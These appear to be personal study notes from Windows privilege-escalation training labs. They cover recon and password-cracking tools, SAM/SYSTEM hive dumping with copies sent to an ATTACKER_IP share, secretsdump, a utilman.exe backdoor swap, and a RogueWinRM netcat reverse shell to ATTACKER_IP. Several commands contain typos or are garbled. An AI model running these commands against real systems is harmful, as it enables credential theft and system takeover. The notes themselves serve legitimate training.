## Table of Contents

    - [burpsuite:](#burpsuite:)

Cybersecurity training/commands/notes:
- `whois`
- `request` and response protocol (RFC 3912)
	- a `whois` server listens on TCP port `43` for incoming requests. 
	- The `domain registrar` is responsible for maintining the `whois` record
	- `Registrar`: Via which registrar was the domain name registered
	- Contact info
	- Creation, update, EXP dates: When was the domain name first registered>
```bash
nmap <target IP address or hostname>	

msfconsole (metasploit 0 start scanning for vulnerability and launch attacks.)

aircrack-ng <path to the capture file>
	to crack a WOA/WPA2-PSK password you can use:
	aircrack-ng <path to the capture file>
	aircrack-ng capture.cap -w <path to the wordlist>
```

### burpsuite:
- A web application security testing tol used for testing the security of web applications. It can be used for intercepting and modifying HTTP Traffic and testign for vukn


[John The Ripper - Password cracking]
	-used for testing strength of passwirds, can be used to crack passwords in various formats such as unix, windows LM and NTLM hashes and more. TO USE:
```bash
john <path to the password file>
(For Unix passwd): john /etc/shadow
```


`Hydra`: A network login cracker used for testing the strength of passwird for various services such as FTO, SSH, Telnet, and more.:
```
hydra <target IP address ir hostname> <service> <options>

To cracj an FTP Server password: hydra -l <username> -P <path to the password file>
```


`dig`, the acronym for “Domain Information Groper,” if you are curious. Let’s use dig 


`Nikto`: Nikto is a web server scanner used for testing the security of web servers. It can be used to test for various vulnerabilities such as outdated software, misconfigurations, and more. To use Nikto, you can use the following command:


```bash
nikto -h <target IP address or hostname>

nikto -h example.com

nslookup <hostname/IP Adress> [-type=mx, -debug]
```
`nslookup` is most often used by system administrators and network 
engineers to troubleshoot DNS-related issues such as DNS server configuration problems, DNS cache poisoning attacks, and DNS lookup failures. 

It can also be used to perform reconnaissance during penetration testing and other security assessments, as it can reveal information about the target network infrastructure and domain name system.

DNS lookup tools, such as nslookup and dig, cannot find subdomains on their own. The domain you are inspecting might include a different subdomain that can reveal much information about the target

https://dnsdumpster.com/ - look for subdomains. Offers detailed answers to DNS queries such as DNSDumpster.
OSINT^^^^ ~ Used to map the organization companies networks

http://onnii6niq53gv3rvjpi7z5axkasurk2x5w5lwliep4qyeb2azagxn4qd.onion/thread-627.html



to check a user assigned set of priveleges:
`whoami /priv`
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants - Complete list of system variables.
				Only those that allow esacalation are of interest.



--SeBackup/SeRestore--
allows users to read and write to any file in the system, ignoring any dynamic access control list (DACL) in place already
		**Tasks consists of copying the SA< and SYSTEM registry hives to extract the local administrator's password hash

	>to backup the SAM and SYSTEM hashes `C:\> reg save hklm\system C:\Users\THMBackup\system.hive
										 `C:\> reg save hklm\sam C:\

			Use SMB or another service to relay hash contents back to machine through smb2support EX:
				smb2support -username THMBackup -password CopyMaster555 public share

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 

Command Prompt
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
	-then use impacket to retrieve the users'password hashes: python /opy/impacket/secretsdump.py -sam system.hive LOCAL

>>Perform a pass the hash attack and gain access to the target machine SYSTEM privleges:


---RDP COMMAND LINUX -> WINDOWS--

sudo apt-get install freerdp2-x11

xfreerdp /u:<username> /p:<password> /v:<ip-address-of-target-machine>



--SeTakeOwnership--


This privelege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possiblities for an attacker to elevate priveleges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. 

	> If enabled then use `utilman.exe` to escalate priveleges ~ Utilman is a built it application for providing ease of access options during the lock screen.
		-gain SYSTEM priv's once original binary for any payloar is used.

	>Take ownership of it: `takeown /f C:\Windows\System32\Utilman.exe
		-Being own of a file doesn't give privleges over it, but being the owner you can assign yourself priveleges you need. 

			~to give full Ownership over utilman.exe to the `User`:
			C:\> `icacls C:\Windows\System32\Utilman.exe` /grant THMTakeOwnership:F

			~replace utilman.exe with a copy of cmd.exe> copy cmd.exe utilman.exe
				to triget utilman lock screen from start button
				C:\Windows\System32\> copy cmd.exe utilman.exe



-- Selmpersonate / SeAssignPrimaryToken --

allow a process to impersonate other users and act other on the users' behalf. Impersonation consists of being able to spawna process or thread under the security contect of another user.
		-Think of FTP service 1-1 relation

if user A logs in to the FTP service and a {FTP USER} has impersonation privileges, it can borrow Ann's access token and use it to access her files.  	

In windows LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have Selmpersonate + SeAssignPrimaryToken priveleges.
	IIS also create similar deafulat accounts called "iis appool/defaultapppool" For web applications.



Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://MACHINE_IP/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for 

RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.


exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service
	-Port 5985 is a port that exposes a Powershell console to be used remotely through the network.

	if attacker has selmpersonate privileges: Can execute any command on behalf of the connecting user, which is SYSTEM
		~Basically equal to getting ssh root priveleges but with powershell.

Attacker can start a fake WinRM service on port 5985 and catch the authentication attemp made by the BITS service when starting if the attacker has Selmpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

	Before runnin exploit start nc listener to receive a reverse shell:

	nc -lvp 4442

	c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
	From the Web Shell:
				-p : specifies the executable to be run by the exploit
				-a : specifies arguments to pass to the executable
					since we want a reveseshell against our attacker machine, the arguments to netcat will be:
				-e cmd.exe ATTACKER_IP 4442




--AUTOMATED PRIVELEGE ESCALATION TOOLS: 
WinPEAS- script developed to enumerate the target system to uncover privelege escaltion paths. Can find more info from precompiled exe or .bat script

PrivescCheck- PowerShell script that searches common privelege escalation on the target system. It provides an alternative to WinPEAS without requiring executing of a binary file.
!!!!!!!=To run on target may need to bypass the execution policy restrictions. Use: Set-ExecutionPolicy cmdlet as shown below>>
	>Set-ExecutionPolicy Bypass -Scope - process -Force
	>..\PrivescCheck.ps1
	>Invoke-privescCheck


WES-BG- Windows Exploit Suggester - Next Generation
Eploit suggesting script. Functions the same way as WinPEAS however it doesn't require the download and execution of a binary script.
	-Python scripy
	-once downloaded `wes.py --update
	-to use will need to run `systeminfo` on target system. Dont forget ti direct the output to a .txt file you will need to move on your attacking machine.


meterpreter> multi/recon/local_exploit_suggester
	-Lists vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.




















































